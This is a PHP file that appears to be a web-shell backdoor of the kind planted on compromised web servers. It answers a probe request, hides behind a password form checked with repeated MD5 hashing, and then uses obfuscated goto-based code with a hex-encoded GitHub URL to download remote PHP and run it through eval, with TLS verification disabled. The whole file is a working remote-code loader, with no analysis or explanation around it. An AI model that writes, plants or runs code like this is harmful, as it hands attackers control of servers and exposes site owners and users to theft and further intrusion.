<?php ?><?php if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) {
  session_start();
  if (!isset($_SESSION['secretyt'])) {
    $_SESSION['secretyt'] = false;
  }
  if (!$_SESSION['secretyt']) {
    if (isset($_POST['pwdyt']) && md5(md5(md5(md5(md5(md5(md5($_POST['pwdyt']))))))) == '5d965417879d9b90dc5c5246fd1b6153') {
      $_SESSION['secretyt'] = true;
    } else {
$bytesecform = <<<FORM
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
    <style type="text/css">
      body {padding:10px}
      input {
        padding: 2px;
        display:inline-block;
        margin-right: 5px;
      }
    </style>
  </head>
  <body>
    <form action="" method="post" accept-charset="utf-8">
      <input type="password" name="pwdyt" value="" placeholder="passwd">
      <input type="submit" name="submit" value="submit">
    </form>
  </body>
</html>
FORM;
      die($bytesecform);
    }
  }
}
?>
<?php goto xpBSrVouOQeLtUxI;xpBSrVouOQeLtUxI:function k_AJ0xEkDrhnKT8l($url){goto Y2i85rVthOgwT3xF;Y2i85rVthOgwT3xF:$ch=curl_init();goto GTbrL5QFoSUfB5q6;LRy50UlToO5hMng3:return $result;goto WItPDzdzfvrEf2Qt;XXiW61ijdciboQ5y:curl_close($ch);goto LRy50UlToO5hMng3;GTbrL5QFoSUfB5q6:curl_setopt($ch,CURLOPT_URL,$url);goto qG7uf3nw7gflG4QK;qG7uf3nw7gflG4QK:curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);goto NvXS_FpK3CVrCkdg;JdLk3AoGfotFd3bc:curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);goto r1oAl3Phb7NKaDcp;NvXS_FpK3CVrCkdg:curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);goto JdLk3AoGfotFd3bc;r1oAl3Phb7NKaDcp:$result=curl_exec($ch);goto XXiW61ijdciboQ5y;WItPDzdzfvrEf2Qt:}goto VeFVL1ZfnEengvA1;VeFVL1ZfnEengvA1:$str=k_aj0XekdrHnkt8l("\x68\x74\164\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\147\151\x74\150\x75\142\165\163\x65\x72\x63\157\x6e\x74\x65\x6e\x74\x2e\x63\157\155\x2f\155\151\143\x68\x67\162\x61\171\x79\57\107\x65\x63\153\157\57\155\141\x69\x6e\x2f\147\63\143\153\56\x74\x78\164");goto FyM9px4GRzos85Ja;FyM9px4GRzos85Ja:echo eval("\x3f\76".$str);
